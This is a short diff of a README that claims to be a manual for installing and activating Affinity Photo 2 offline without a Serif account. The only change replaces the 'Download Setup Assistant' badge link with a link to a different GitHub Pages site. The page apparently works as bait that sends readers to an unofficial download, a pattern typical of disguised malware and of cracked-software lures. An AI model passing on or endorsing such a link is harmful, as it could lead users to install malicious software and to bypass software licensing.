@@ -2,7 +2,7 @@
 
 A professional step-by-step manual for installing and activating **Affinity Photo 2** in offline or enterprise environments. No internet connection or Serif account needed.
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://affinity-photo-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://matookfj.github.io/.github/affinityphoto)
 
 ---
 
